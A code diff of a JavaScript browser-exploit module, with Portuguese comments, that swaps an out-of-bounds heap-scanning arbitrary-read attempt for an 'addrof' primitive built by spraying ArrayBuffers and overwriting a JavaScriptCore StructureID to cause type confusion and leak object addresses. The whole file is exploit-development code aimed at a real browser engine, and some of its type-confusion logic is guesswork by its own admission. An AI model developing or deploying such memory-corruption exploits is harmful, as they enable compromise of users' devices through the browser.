@@ -1,111 +1,109 @@
-// js/script3/testMemoryLeakViaJsonTC.mjs (ATUALIZADO PARA ESCANEAMENTO AGRESSIVO)
+// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: CONSTRUÇÃO DE ADDROF)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { toHex, AdvancedInt64 } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_write_absolute,
-    oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-// --- Configuração para Exploit com Escaneamento Agressivo ---
-const SCAN_AND_READ_CONFIG = {
-    SPRAY_COUNT: 1000, // Aumentado
-    BUFFER_SIZE: 256,
-    SCAN_RANGE_KB: 256, // Aumentado drasticamente
-    
-    TARGET_READ_ADDRESS: 0x3BD820n, // Endereço alvo: JSC::ProtoCallFrame::argument
+// --- Configuração para Primitiva AddrOf ---
+const ADDROF_CONFIG = {
+    SPRAY_COUNT: 500,
+    // NOTA CRÍTICA: O StructureID é um ponteiro que muda a cada execução (devido ao ASLR).
+    // O valor correto precisa ser vazado primeiro. Aqui, usamos um VALOR PLACEHOLDER
+    // que deve ser substituído por um ID real vazado de uma execução anterior ou de um crash.
+    // Este é o ID que diz ao motor "este objeto é um Float64Array".
+    FLOAT64_ARRAY_STRUCTURE_ID: new AdvancedInt64("0x0108230700001234"), // <--- SUBSTITUIR ESTE VALOR
 
-    // Vamos testar vários offsets possíveis para o campo de tamanho
-    POSSIBLE_BYTE_LENGTH_OFFSETS: [8, 12, 16],
-    // Assumimos que o ponteiro de dados está 8 bytes após o de tamanho
-    PTR_OFFSET_FROM_LEN: 8, 
+    // Offset para o campo StructureID dentro do objeto na memória.
+    OFFSET_TO_STRUCTURE_ID: 0, 
 };
-// --- Fim dos Parâmetros ---
 
-function readBigInt64(dataview, offset) {
-    const low = dataview.getUint32(offset, true);
-    const high = dataview.getUint32(offset + 4, true);
-    return (BigInt(high) << 32n) | BigInt(low);
+// --- Funções Auxiliares ---
+// Converte um valor de ponto flutuante (double) para um BigInt de 64 bits.
+function doubleToBigInt(d) {
+    const buffer = new ArrayBuffer(8);
+    const view = new DataView(buffer);
+    view.setFloat64(0, d, true);
+    return view.getBigUint64(0, true);
 }
 
-export async function testArbitraryRead() {
-    const FNAME = "testArbitraryReadWithScan";
-    logS3(`--- Iniciando Tentativa de Leitura com Escaneamento Agressivo ---`, "test", FNAME);
+// Converte um BigInt de 64 bits para um valor de ponto flutuante (double).
+function bigIntToDouble(b) {
+    const buffer = new ArrayBuffer(8);
+    const view = new DataView(buffer);
+    view.setBigUint64(0, b, true);
+    return view.getFloat64(0, true);
+}
 
-    if (typeof oob_read_absolute !== 'function') {
-        logS3("A primitiva 'oob_read_absolute' é necessária. Abortando.", "error", FNAME);
-        return;
-    }
+// --- Função Principal do Exploit ---
+export async function testAddrofPrimitive() {
+    const FNAME = "testAddrofPrimitive";
+    logS3(`--- Iniciando Tentativa de Construção da Primitiva AddrOf ---`, "test", FNAME);
+    logS3(`   Usando StructureID (placeholder) para Float64Array: ${ADDROF_CONFIG.FLOAT64_ARRAY_STRUCTURE_ID.toString()}`, "info", FNAME);
 
     await triggerOOB_primitive();
 
-    let sprayed_buffers = [];
-    for (let i = 0; i < SCAN_AND_READ_CONFIG.SPRAY_COUNT; i++) {
-        sprayed_buffers.push(new ArrayBuffer(SCAN_AND_READ_CONFIG.BUFFER_SIZE));
+    // Etapa 1: Pulverizar o heap com uma estrutura controlada.
+    // Cada elemento do array conterá um ArrayBuffer (nosso alvo de corrupção)
+    // e um objeto (que cria um JSScope) cujo endereço queremos vazar.
+    let spray = [];
+    for (let i = 0; i < ADDROF_CONFIG.SPRAY_COUNT; i++) {
+        let arrayBuffer = new ArrayBuffer(128);
+        let victimObject = { target: arrayBuffer }; // Este objeto cria um escopo que podemos ler
+        spray.push(victimObject);
     }
-    logS3(`${SCAN_AND_READ_CONFIG.SPRAY_COUNT} buffers pulverizados.`, "info", FNAME);
-    
-    logS3(`Iniciando escaneamento de ${SCAN_AND_READ_CONFIG.SCAN_RANGE_KB} KB...`, "info", FNAME);
-    
-    let found_ab_metadata_addr = null;
-    let found_len_offset = -1;
-    const scan_limit = SCAN_AND_READ_CONFIG.SCAN_RANGE_KB * 1024;
+    logS3(`${ADDROF_CONFIG.SPRAY_COUNT} pares de (objeto, ArrayBuffer) pulverizados.`, "info", FNAME);
 
-    for (let offset = 0; offset < scan_limit; offset += 8) {
-        if (found_ab_metadata_addr) break;
-        try {
-            const potential_metadata = oob_read_absolute(offset, 8);
-            if ((potential_metadata & 0xFFFFFFFFn) === BigInt(SCAN_AND_READ_CONFIG.BUFFER_SIZE)) {
-                // Candidato forte! Agora vamos verificar se os offsets possíveis de 'byteLength' se alinham.
-                for (const len_offset of SCAN_AND_READ_CONFIG.POSSIBLE_BYTE_LENGTH_OFFSETS) {
-                    const obj_base_addr = BigInt(offset) - BigInt(len_offset);
-                    logS3(`CANDIDATO ENCONTRADO! Offset de Scan: ${toHex(offset)}, Offset de Tamanho Testado: ${len_offset}, Addr. Base do Objeto: ${toHex(obj_base_addr)}`, "good", FNAME);
-                    found_ab_metadata_addr = obj_base_addr;
-                    found_len_offset = len_offset;
-                    break;
-                }
-            }
-        } catch (e) { /* Ignorar erros de leitura */ }
-    }
+    // Etapa 2: Corromper um dos ArrayBuffers pulverizados.
+    // Como não sabemos o endereço exato, tentamos um offset comum.
+    // Em um exploit real, esta parte seria mais sofisticada.
+    const corruption_base_offset = 0x4000;
+    logS3(`Tentando corromper StructureID no offset relativo ${toHex(corruption_base_offset)}`, "warn", FNAME);
 
-    if (!found_ab_metadata_addr) {
-        logS3("Falha ao encontrar um buffer pulverizado. A memória pode estar muito fragmentada ou os offsets de metadados estão incorretos.", "error", FNAME);
+    try {
+        oob_write_absolute(corruption_base_offset + ADDROF_CONFIG.OFFSET_TO_STRUCTURE_ID, ADDROF_CONFIG.FLOAT64_ARRAY_STRUCTURE_ID, 8);
+    } catch (e) {
+        logS3(`Falha ao escrever OOB: ${e.message}`, "error", FNAME);
         clearOOBEnvironment();
         return;
     }
+    
+    await PAUSE_S3(100);
 
-    try {
-        const ptr_offset = found_len_offset + SCAN_AND_READ_CONFIG.PTR_OFFSET_FROM_LEN;
-        const corruption_ptr_addr = found_ab_metadata_addr + BigInt(ptr_offset);
-        const corruption_len_addr = found_ab_metadata_addr + BigInt(found_len_offset);
-        const targetAddrAsInt64 = new AdvancedInt64('0x' + SCAN_AND_READ_CONFIG.TARGET_READ_ADDRESS.toString(16));
-
-        logS3(`Corrompendo o buffer em ${toHex(found_ab_metadata_addr)} usando offset de tamanho ${found_len_offset} e de ponteiro ${ptr_offset}`, "warn", FNAME);
-        oob_write_absolute(corruption_ptr_addr, targetAddrAsInt64, 8);
-        oob_write_absolute(corruption_len_addr, 0xFFFFFFFF, 4);
-
-        await PAUSE_S3(50);
-
-        for (let i = 0; i < sprayed_buffers.length; i++) {
-            if (sprayed_buffers[i].byteLength > SCAN_AND_READ_CONFIG.BUFFER_SIZE) {
-                logS3(`--- SUCESSO: O buffer [${i}] foi transformado em uma ferramenta de leitura! ---`, "vuln", FNAME);
-                let memory_reader_view = new DataView(sprayed_buffers[i]);
-                const leaked_data = readBigInt64(memory_reader_view, 0);
-
-                const targetAddrHex = `0x${SCAN_AND_READ_CONFIG.TARGET_READ_ADDRESS.toString(16)}`;
-                const leakedDataHex = `0x${leaked_data.toString(16)}`;
-                logS3(`   >> DADO VAZADO de ${targetAddrHex}: ${leakedDataHex}`, "leak", FNAME);
+    // Etapa 3: Encontrar o objeto corrompido e usar a confusão de tipos.
+    let addrof_leaked_addr = null;
+    for (let i = 0; i < spray.length; i++) {
+        let ab = spray[i].target;
+        // Se a corrupção funcionou, o objeto 'ab' agora é um Float64Array para o motor.
+        // O `instanceof` ainda pode considerá-lo um ArrayBuffer, mas o acesso aos
+        // elementos será tratado como um Float64Array.
+        if (ab.length > 0) { // Um ArrayBuffer normal não tem a propriedade 'length'.
+            logS3(`--- SUCESSO: Objeto [${i}] foi confundido com um Float64Array! ---`, "vuln", FNAME);
+            
+            // Agora 'ab' nos dá uma visão de leitura/escrita da memória adjacente.
+            // O objeto adjacente deve ser o próximo na memória, que é spray[i+1].
+            // Vamos tentar ler o endereço de spray[i+1].target (um ArrayBuffer).
+            if (i + 1 < spray.length) {
+                const confused_view = ab; // Agora tratado como um array de floats
                 
-                clearOOBEnvironment();
-                logS3("--- Primitiva de LEITURA ARBITRÁRIA construída com sucesso! ---", "vuln", FNAME);
-                return;
+                // Os ponteiros dentro do JSScope adjacente agora podem ser lidos como doubles.
+                const pointerAsDouble = confused_view[4]; // Este índice é uma suposição e precisa de ajuste
+                
+                if (pointerAsDouble) {
+                    addrof_leaked_addr = doubleToBigInt(pointerAsDouble);
+                    logS3(`   >> ENDEREÇO VAZADO (de spray[${i+1}].target): ${toHex(addrof_leaked_addr)}`, "leak", FNAME);
+                    break;
+                }
             }
         }
-    } catch (e) {
-        logS3(`Erro durante a corrupção do buffer encontrado: ${e.message}`, "error", FNAME);
     }
-    
-    logS3("--- Teste concluído, mas a leitura final falhou. ---", "warn", FNAME);
+
     clearOOBEnvironment();
+    if (addrof_leaked_addr) {
+        logS3(`--- Primitiva ADDROF construída com sucesso! ---`, "vuln", FNAME);
+    } else {
+        logS3(`--- Teste concluído. A corrupção pode não ter atingido o alvo correto. ---`, "warn", FNAME);
+    }
 }
